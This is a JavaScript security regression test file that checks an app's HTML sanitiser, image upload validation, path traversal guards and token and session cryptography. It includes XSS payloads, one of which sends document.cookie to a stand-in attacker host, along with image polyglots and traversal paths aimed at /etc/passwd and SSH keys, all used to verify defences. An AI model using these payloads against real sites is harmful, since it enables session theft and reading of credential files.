/**
 * Security regression tests: stored XSS, upload validation, path traversal,
 * and password-reset token handling.
 */
import test from "node:test";
import assert from "node:assert/strict";

process.env.AUTH_SECRET = "test-secret-0123456789abcdefghijklmnopqrstuvwx";

test("VULN-05: settings HTML cannot introduce attacker scripts", async () => {
  const { sanitizeTrustedHtml } = await import("../../src/lib/sanitize.ts");

  const cases = [
    // The exact escalation previously available to any `admin`.
    '<script src="https://evil.example.com/steal.js"></script>',
    "<script>fetch('https://evil.example.com?c='+document.cookie)</script>",
    '<img src=x onerror="alert(1)">',
    '<svg onload="alert(1)"></svg>',
    '<a href="javascript:alert(1)">click</a>',
    '<a href="  javascript:alert(1)">spaced</a>',
    '<iframe src="https://evil.example.com"></iframe>',
    '<form action="https://evil.example.com"><input></form>',
    '<div style="background:url(javascript:alert(1))">x</div>',
    '<ins style="background:url(https://evil.example.com/x)">ad</ins>',
  ];

  for (const payload of cases) {
    const out = sanitizeTrustedHtml(payload);
    assert.ok(!/evil\.example\.com/.test(out), `payload leaked a foreign host: ${payload} → ${out}`);
    assert.ok(!/<script[^>]*src=/i.test(out), `script tag survived: ${payload} → ${out}`);
    assert.ok(!/onerror\s*=/i.test(out), `event handler survived: ${payload} → ${out}`);
    assert.ok(!/onload\s*=/i.test(out), `event handler survived: ${payload} → ${out}`);
    assert.ok(!/javascript:/i.test(out), `javascript: URI survived: ${payload} → ${out}`);
    assert.ok(!/<iframe/i.test(out), `iframe survived: ${payload} → ${out}`);
    assert.ok(!/<form/i.test(out), `form survived: ${payload} → ${out}`);
  }
});

test("VULN-05b: allowlisted ad scripts still work", async () => {
  const { sanitizeTrustedHtml } = await import("../../src/lib/sanitize.ts");
  const out = sanitizeTrustedHtml(
    '<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>',
  );
  assert.match(out, /pagead2\.googlesyndication\.com/, "allowlisted integration must be preserved");
});

test("VULN-05c: article rich text strips script but keeps embeds", async () => {
  const { sanitizeRichText } = await import("../../src/lib/sanitize.ts");
  const out = sanitizeRichText(
    '<p>Hi</p><script>alert(1)</script><iframe src="https://www.youtube.com/embed/abc"></iframe>',
  );
  assert.ok(!/<script/i.test(out), "script must be removed from article bodies");
  assert.match(out, /youtube\.com\/embed\/abc/, "trusted video embeds must survive");
});

test("VULN-07: uploads are classified by bytes, not by client headers", async () => {
  const { detectImageType, truncateToImageEnd } = await import("../../src/lib/media-storage.ts");

  const png = Buffer.from(
    "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c6360000002000100ffff03000006000557bfabd40000000049454e44ae426082",
    "hex",
  );
  assert.equal(detectImageType(png)?.mime, "image/png");

  const jpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01]);
  assert.equal(detectImageType(jpeg)?.mime, "image/jpeg");

  const webp = Buffer.concat([Buffer.from("RIFF"), Buffer.from([0x1a, 0, 0, 0]), Buffer.from("WEBPVP8 "), Buffer.alloc(20)]);
  assert.equal(detectImageType(webp)?.mime, "image/webp");

  // Executables, HTML and SVG masquerading as images must be rejected outright.
  const notImages = [
    Buffer.from("%PDF-1.7\n..."),
    Buffer.from("<html><script>alert(1)</script></html>"),
    Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
    Buffer.from("#!/bin/sh\necho hi"),
    Buffer.from([0x4d, 0x5a, 0x90, 0x00]), // PE/EXE
    /*
     * GIF header + appended HTML polyglot. Includes a trailer (0x3B) at a
     * plausible offset so the file passes the structural minimum, which is
     * exactly the case truncation must handle.
     */
    Buffer.concat([
      Buffer.from("GIF89a"),
      Buffer.alloc(10, 0),
      Buffer.from([0x3b]),
      Buffer.from("<script>alert(1)</script>"),
    ]),
  ];
  for (const buf of notImages) {
    const detected = detectImageType(buf);
    // A GIF header is accepted, but the payload after the trailer is cut off.
    if (detected?.requiresReencode) {
      const trimmed = truncateToImageEnd(buf, detected.mime);
      assert.ok(trimmed !== null, "a structurally valid GIF must still be truncatable");
      assert.ok(trimmed.length <= buf.length);
      assert.ok(!/<script/i.test(trimmed.toString("latin1")), "GIF polyglot payload must be truncated");
    } else {
      assert.equal(detected, null, `must not accept ${buf.subarray(0, 8).toString("hex")}`);
    }
  }
});

test("VULN-07b: appended payloads are removed from valid images", async () => {
  const { truncateToImageEnd } = await import("../../src/lib/media-storage.ts");
  const html = Buffer.from("<script>alert('xss')</script>");

  const png = Buffer.concat([
    Buffer.from(
      "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c6360000002000100ffff03000006000557bfabd40000000049454e44ae426082",
      "hex",
    ),
    html,
  ]);
  const cleaned = truncateToImageEnd(png, "image/png");
  assert.ok(!cleaned.toString("latin1").includes("<script>"), "trailing payload must be stripped");
});

test("VULN-09: path traversal is blocked using path boundaries", async () => {
  const { resolveUploadPath, UPLOAD_ROOT } = await import("../../src/lib/media-storage.ts");
  const path = await import("node:path");

  const attacks = [
    ["..", "etc", "passwd"],
    ["../..", "etc", "passwd"],
    ["..%2f..%2fetc%2fpasswd"],
    ["/etc/passwd"],
    ["....//....//etc/passwd"],
    [".ssh", "id_rsa"],
    ["sub/../../etc/passwd"],
    [""],
    [],
  ];

  for (const segments of attacks) {
    const resolved = resolveUploadPath(segments);
    assert.equal(resolved, null, `must reject ${JSON.stringify(segments)}`);
  }

  const ok = resolveUploadPath(["2026", "photo-abc.jpg"]);
  assert.ok(ok, "a legitimate nested path must resolve");
  assert.ok(path.resolve(ok).startsWith(path.resolve(UPLOAD_ROOT)), "resolved path stays inside the upload root");

  // Critical regression: a sibling directory sharing the prefix must NOT pass.
  const sibling = path.resolve(UPLOAD_ROOT + "-backup", "x.jpg");
  const relative = path.relative(path.resolve(UPLOAD_ROOT), sibling);
  assert.ok(relative.startsWith(".."), "prefix-sibling escapes must be detectable via path.relative");
});

test("VULN-03/04: reset tokens are hashed, unique, and single-lookup", async () => {
  const { hashToken, randomToken, timingSafeEqual } = await import("../../src/lib/crypto.ts");

  const t1 = randomToken(32);
  const t2 = randomToken(32);
  assert.notEqual(t1, t2, "tokens must be unique");
  assert.ok(t1.length >= 40, "token must carry enough entropy");

  const h1 = hashToken(t1);
  assert.match(h1, /^[0-9a-f]{64}$/, "stored value is a hex SHA-256 digest, not the token");
  assert.ok(!h1.includes(t1), "hash must not contain the plaintext token");
  assert.equal(hashToken(t1), h1, "hashing is deterministic for indexed lookup");

  assert.ok(timingSafeEqual(h1, hashToken(t1)));
  assert.ok(!timingSafeEqual(h1, hashToken(t2)));
  assert.ok(!timingSafeEqual("short", "much longer value"));
});

test("VULN-03: session state is encrypted and tamper-evident", async () => {
  const { sealSessionState, openSessionState } = await import("../../src/lib/crypto.ts");

  const sealed = sealSessionState({ sid: "abc123", ver: 5 });
  const opened = openSessionState(sealed);
  assert.deepEqual(opened, { sid: "abc123", ver: 5 });

  // Flipping a byte must fail authentication, not decode to garbage.
  const raw = Buffer.from(sealed, "base64url");
  raw[raw.length - 1] ^= 0xff;
  assert.equal(openSessionState(raw.toString("base64url")), null, "tampered state must be rejected");
});

test("VULN-05d: JSON-LD serialisation cannot break out of the script element", async () => {
  const { toJsonLdScript } = await import("../../src/lib/sanitize.ts");

  const payloads = [
    'Boom</script><img src=x onerror=alert(1)>',
    '<!--<script>',
    'javascript:alert(1)',
    '</SCRIPT ><svg onload=alert(1)>',
    'line\u2028sep\u2029para',
  ];

  for (const headline of payloads) {
    const data = { "@type": "NewsArticle", headline, nested: { headline } };
    const out = toJsonLdScript(data);

    assert.ok(!/<\/script/i.test(out), `must not emit </script> for ${JSON.stringify(headline)}`);
    assert.ok(!out.includes("<!--"), "must not emit an open comment");
    assert.ok(!out.includes("\u2028") && !out.includes("\u2029"), "must escape line separators");
    // Escaping is lossless: the JSON value the browser parses is unchanged.
    assert.deepEqual(JSON.parse(out), data);
  }
});
